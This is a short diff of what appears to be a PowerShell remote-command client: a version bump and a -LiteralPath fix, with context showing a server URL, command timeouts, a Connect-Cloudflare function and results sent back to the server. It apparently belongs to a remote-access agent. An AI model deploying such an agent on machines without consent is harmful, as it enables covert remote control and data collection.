@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.0.7"
+$Version = "3.0.8"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -1066,7 +1066,7 @@ function Connect-Cloudflare {
                         } catch { $cwd = (Get-Location).Path }
                         $filePath = [System.IO.Path]::Combine($cwd, $filePath)
                     }
-                    if (-not (Test-Path $filePath -PathType Leaf)) {
+                    if (-not (Test-Path -LiteralPath $filePath -PathType Leaf)) {
                         Send-Result-To-Server -Body "[!] File not found: $filePath`n"
                         Start-Sleep -Milliseconds $activeDelay
                         continue
